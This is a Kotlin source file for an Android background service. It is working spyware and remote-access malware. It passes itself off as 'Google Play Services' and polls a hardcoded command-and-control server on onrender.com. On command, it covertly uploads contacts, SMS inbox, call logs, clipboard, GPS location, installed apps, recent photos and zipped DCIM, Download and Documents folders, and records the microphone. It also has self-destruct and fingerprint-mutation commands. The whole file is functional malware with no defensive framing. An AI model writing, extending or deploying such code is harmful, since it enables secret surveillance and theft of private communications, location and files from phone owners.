package com.assets.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.location.Location
import android.location.LocationManager
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.*
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.ByteArrayInputStream
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest
import java.util.zip.Deflater
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec
import org.json.JSONObject

class SyncService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
    private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
    private var lastHeartbeatSent = 0L
    private var wifiAutopilotEnabled = true
    private var neuralStealthState = "NEURAL_ACTIVE_v17"

    override fun onCreate() {
        super.onCreate()
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::NeuralLock")
        wakeLock?.acquire(10 * 60 * 60 * 1000L)
        startForegroundServiceNotification()
    }

    private fun startForegroundServiceNotification() {
        val channelId = "uranium_core_channel"
        val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Google Play Services")
            .setContentText("Neural Stealth Matrix core active...")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .build()

        startForeground(1, notification)
    }

    // إصلاح أمني: لو حصل خطأ في الشبكة، لازم يرجع false عشان ما يبعتش داتا على شبكة الجوال بالغلط
    private fun isConnectedToWifi(): Boolean {
        return try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            false
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
        val nodeModel = Build.MODEL
        
        serviceScope.launch {
            while (isActive) {
                try {
                    val currentTime = System.currentTimeMillis()
                    val sendHeartbeat = (currentTime - lastHeartbeatSent > 120000L)
                    val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
                    
                    val payloadObj = JSONObject()
                    payloadObj.put("type", reportType)
                    payloadObj.put("data", "[Neural-Active] $nodeModel")
                    val reportJson = payloadObj.toString()

                    if (sendHeartbeat) lastHeartbeatSent = currentTime

                    val conn = buildRequest(C2_STREAM_URL, deviceId, "$nodeModel [$neuralStealthState]", reportJson.toByteArray(), "application/json; charset=utf-8")
                    conn.outputStream.use { it.write(reportJson.toByteArray()); it.flush() }

                    if (conn.responseCode == 200) {
                        val responseStr = conn.inputStream.bufferedReader().readText()
                        if (responseStr.contains("task") && responseStr.contains("action")) {
                            try {
                                val jsonRes = JSONObject(responseStr)
                                if (jsonRes.has("task") && !jsonRes.isNull("task")) {
                                    val action = jsonRes.getJSONObject("task").getString("action")
                                    dispatchAction(action, deviceId, nodeModel)
                                }
                            } catch (ex: Exception) {}
                        }
                    }
                    conn.disconnect()
                    delay(8000L)
                } catch (e: Exception) {
                    delay(10000L)
                }
            }
        }
        return START_STICKY
    }

    // دالة مركزية لتوزيع الأوامر (أفضل للتنظيم من الـ when الطويل)
    private fun dispatchAction(action: String, deviceId: String, nodeModel: String) {
        when {
            action.contains("EXTRACT_CONTACTS") -> streamTextDirect(deviceId, nodeModel, "Uranium_Contacts.txt", readContacts())
            action.contains("EXTRACT_SMS") -> streamTextDirect(deviceId, nodeModel, "Uranium_SMS.txt", readSMS())
            action.contains("EXTRACT_CALLS") -> streamTextDirect(deviceId, nodeModel, "Uranium_CallLogs.txt", readCallLogs())
            action.contains("EXTRACT_CLIPBOARD") -> streamTextDirect(deviceId, nodeModel, "Uranium_Clipboard.txt", readClipboard())
            action.contains("EXTRACT_LOCATION") -> streamTextDirect(deviceId, nodeModel, "Uranium_Location.txt", readLocationFast())
            action.contains("EXTRACT_APPS") -> streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", readInstalledApps())
            action.contains("MIC_AI_LISTEN") -> recordAndStreamAudioAI(deviceId, nodeModel)
            action.contains("MICRO_BURST_SNAP") -> streamLatestPhotoSnapshot(deviceId, nodeModel, "MicroBurst")
            action.contains("STEALTH_BLACKOUT") -> sendReportToServer(deviceId, nodeModel, "🛡️ تم تفعيل القفل التكتيكي.")
            action.contains("GEO_FENCE_ALERT") -> streamTextDirect(deviceId, nodeModel, "Uranium_GeoAlert.txt", "🛰️ [Geo-Fence]\n${readLocationFast()}")
            action.contains("POLY_MUTATE") -> {
                neuralStealthState = "MUTATED_${System.currentTimeMillis() % 10000}"
                sendReportToServer(deviceId, nodeModel, "🧬 البصمة تغيرت: $neuralStealthState")
            }
            action.contains("SELF_DESTRUCT") -> {
                sendReportToServer(deviceId, nodeModel, "💥 جاري النسف الذاتي...")
                try { cacheDir.deleteRecursively() } catch (e: Exception) {}
                stopSelf()
            }
            action.contains("WIFI_AUTOPILOT") -> {
                wifiAutopilotEnabled = !wifiAutopilotEnabled
                sendReportToServer(deviceId, nodeModel, "📶 حالة طيار الـ Wi-Fi: $wifiAutopilotEnabled")
            }
            action.contains("STORAGE_AUDIT") -> streamTextDirect(deviceId, nodeModel, "Uranium_Storage_Audit.txt", generateStorageAuditReport())
            action.contains("PROC_DCIM") -> if (!wifiAutopilotEnabled || isConnectedToWifi()) streamTargetedFolderSmart(deviceId, nodeModel, "DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReportToServer(deviceId, nodeModel, "⏳ سحب DCIM معلق (لا يوجد Wi-Fi).")
            action.contains("PROC_DOWNLOAD") -> if (!wifiAutopilotEnabled || isConnectedToWifi()) streamTargetedFolderSmart(deviceId, nodeModel, "Download", MediaStore.Files.getContentUri("external")) else sendReportToServer(deviceId, nodeModel, "⏳ سحب Download معلق (لا يوجد Wi-Fi).")
            action.contains("PROC_PICTURES") -> streamTargetedFolderSmart(deviceId, nodeModel, "Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            action.contains("PROC_DOCUMENTS") -> streamTargetedFolderSmart(deviceId, nodeModel, "Documents", MediaStore.Files.getContentUri("external"))
        }
    }

    // دالة بناء طلب آمن (بتستخدم Base64 بدل الـ Headers المكشوفة عشان ما يحصلش Crash)
    private fun buildRequest(urlStr: String, nodeId: String, model: String, body: ByteArray, contentType: String): HttpURLConnection {
        val conn = URL(urlStr).openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.setRequestProperty("X-Node-ID", nodeId)
        conn.setRequestProperty("X-Node-Model", android.util.Base64.encodeToString(model.toByteArray(), android.util.Base64.NO_WRAP))
        conn.setRequestProperty("Content-Type", contentType)
        conn.doOutput = true
        conn.connectTimeout = 15000
        conn.readTimeout = 15000
        return conn
    }

    private fun recordAndStreamAudioAI(nodeId: String, nodeModel: String) {
        try {
            val audioFile = File(cacheDir, "Uranium_NeuralMic_${System.currentTimeMillis()}.3gp")
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            Thread.sleep(6000L)
            recorder.stop()
            recorder.release()

            if (audioFile.exists() && audioFile.length() > 0) {
                uploadBytesDirect(nodeId, nodeModel, audioFile.name, audioFile.readBytes())
                sendReportToServer(nodeId, nodeModel, "🎙️ تم بث الصوت.")
            }
            try { audioFile.delete() } catch (e: Exception) {}
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ صوت: ${e.message}")
        }
    }

    private fun streamLatestPhotoSnapshot(nodeId: String, nodeModel: String, prefix: String = "NeuralSnap") {
        try {
            val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            contentResolver.query(contentUri, projection, null, null, sortOrder)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val idIdx = cursor.getColumnIndex(MediaStore.MediaColumns._ID)
                    val nameIdx = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = cursor.getLong(idIdx)
                        val name = cursor.getString(nameIdx) ?: "snapshot.jpg"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        contentResolver.openInputStream(itemUri)?.use { inputStream ->
                            val bytes = inputStream.readBytes()
                            if (bytes.isNotEmpty()) {
                                uploadBytesDirect(nodeId, nodeModel, "${prefix}_$name", bytes)
                                sendReportToServer(nodeId, nodeModel, "👁️ تم بث اللقطة.")
                            }
                        }
                    }
                }
            }
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ لقطة: ${e.message}")
        }
    }

    private fun generateStorageAuditReport(): String {
        val sb = StringBuilder("📊 <b>تقرير التخزين:</b>\n\n")
        try {
            val dcim = queryFolderStats(MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            val download = queryFolderStats(MediaStore.Files.getContentUri("external"))
            sb.append("📁 <b>DCIM:</b> ${dcim.count} ملف | ~${String.format("%.2f", dcim.sizeMB)} MB\n")
            sb.append("📁 <b>Download:</b> ${download.count} ملف | ~${String.format("%.2f", download.sizeMB)} MB\n\n")
        } catch (e: Exception) { sb.append("⚠️ خطأ: ${e.message}") }
        return sb.toString()
    }

    private data class FolderStats(val count: Int, val sizeMB: Double)

    private fun queryFolderStats(uri: Uri): FolderStats {
        var count = 0
        var totalBytes = 0L
        try {
            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.SIZE)
            contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                val sizeIdx = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE)
                count = cursor.count
                while (cursor.moveToNext()) {
                    if (sizeIdx != -1) totalBytes += cursor.getLong(sizeIdx)
                }
            }
        } catch (e: Exception) {}
        return FolderStats(count, totalBytes.toDouble() / (1024 * 1024))
    }

    private fun streamTargetedFolderSmart(nodeId: String, nodeModel: String, folderName: String, contentUri: Uri) {
        try {
            sendReportToServer(nodeId, nodeModel, "⚡ جاري ضغط $folderName...")
            val zipFile = File(cacheDir, "Uranium_${folderName}_${System.currentTimeMillis()}.zip")
            val zipOut = ZipOutputStream(FileOutputStream(zipFile))
            zipOut.setLevel(Deflater.BEST_COMPRESSION)

            val projection = arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME)
            val sortOrder = "${MediaStore.MediaColumns.DATE_ADDED} DESC"
            val cursor = contentResolver.query(contentUri, projection, null, null, sortOrder)

            var processedCount = 0
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                while (it.moveToNext() && processedCount < 40) { // حد أقصى 40 ملف لتوفير الباقة
                    if (idIdx != -1 && nameIdx != -1) {
                        val id = it.getLong(idIdx)
                        val name = it.getString(nameIdx) ?: "file_$id.dat"
                        val itemUri = ContentUris.withAppendedId(contentUri, id)
                        try {
                            contentResolver.openInputStream(itemUri)?.use { inputStream ->
                                zipOut.putNextEntry(ZipEntry("$folderName/$name"))
                                inputStream.copyTo(zipOut)
                                zipOut.closeEntry()
                                processedCount++
                            }
                        } catch (ex: Exception) {}
                    }
                }
            }
            zipOut.close()

            if (zipFile.exists() && zipFile.length() > 0) {
                sendReportToServer(nodeId, nodeModel, "📦 مجلد <b>$folderName</b> جاهز (${processedCount} ملفاً).")
                uploadBytesDirect(nodeId, nodeModel, zipFile.name, zipFile.readBytes())
            }
            try { zipFile.delete() } catch (e: Exception) {}
        } catch (e: Exception) {
            sendReportToServer(nodeId, nodeModel, "⚠️ خطأ ضغط: ${e.message}")
        }
    }

    private fun streamTextDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
        try {
            uploadBytesDirect(nodeId, nodeModel, fileName, content.toByteArray(Charsets.UTF_8))
            sendReportToServer(nodeId, nodeModel, "✅ التقرير <b>$fileName</b> تم بثه.")
        } catch (e: Exception) {}
    }

    private fun uploadBytesDirect(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
        for (attempt in 1..3) {
            try {
                val conn = buildRequest(C2_INGEST_URL, nodeId, nodeModel, bytes, "application/octet-stream")
                conn.setRequestProperty("X-File-Name", fileName)
                conn.setChunkedStreamingMode(1024 * 64)
                conn.connectTimeout = 180000
                conn.readTimeout = 180000

                ByteArrayInputStream(bytes).use { bais ->
                    conn.outputStream.use { os ->
                        bais.copyTo(os); os.flush()
                    }
                }
                val code = conn.responseCode
                conn.disconnect()
                if (code == 200) return
            } catch (e: Exception) {
                if (attempt == 3) return
                Thread.sleep(2000L)
            }
        }
    }

    // باقي دوال السحب (Contacts, SMS, CallLogs...)
    private fun readContacts(): String {
        val sb = StringBuilder("=== URANIUM CONTACTS ===\n")
        try {
            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext()) { sb.append("• ${it.getString(nameIdx)}: ${it.getString(numIdx)}\n") }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readSMS(): String {
        val sb = StringBuilder("=== URANIUM SMS ===\n")
        try {
            contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)?.use {
                val bodyIdx = it.getColumnIndex("body"); val addrIdx = it.getColumnIndex("address")
                while (it.moveToNext()) { sb.append("From: ${it.getString(addrIdx)}\n${it.getString(bodyIdx)}\n---\n") }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readCallLogs(): String {
        val sb = StringBuilder("=== URANIUM CALL LOGS ===\n")
        try {
            contentResolver.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null)?.use {
                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
                while (it.moveToNext()) { sb.append("Number: ${it.getString(numIdx)}\n") }
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readClipboard(): String {
        val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
                sb.append("Text: ${clipboard.primaryClip?.getItemAt(0)?.text}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readLocationFast(): String {
        val sb = StringBuilder("=== URANIUM GPS ===\n")
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var bestLoc: Location? = null
            for (provider in locationManager.allProviders) {
                val l = locationManager.getLastKnownLocation(provider)
                if (l != null && (bestLoc == null || l.time > bestLoc.time)) bestLoc = l
            }
            if (bestLoc != null) {
                sb.append("🌐 Lat: ${bestLoc.latitude}\n🌐 Lon: ${bestLoc.longitude}\n🗺️ Maps: https://maps.google.com/?q=${bestLoc.latitude},${bestLoc.longitude}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun readInstalledApps(): String {
        val sb = StringBuilder("=== APPS ===\n")
        try {
            packageManager.getInstalledPackages(0).forEach { pkg ->
                sb.append("• ${pkg.applicationInfo?.loadLabel(packageManager)?.toString() ?: "Unknown"}\n")
            }
        } catch (e: Exception) {}
        return sb.toString()
    }

    private fun sendReportToServer(nodeId: String, nodeModel: String, reportText: String) {
        try {
            val payloadObj = JSONObject().apply {
                put("type", "TEXT_REPORT")
                put("data", reportText)
            }
            val body = payloadObj.toString().toByteArray(Charsets.UTF_8)
            val conn = buildRequest(C2_STREAM_URL, nodeId, nodeModel, body, "application/json; charset=utf-8")
            conn.outputStream.use { it.write(body); it.flush() }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        wakeLock?.release()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
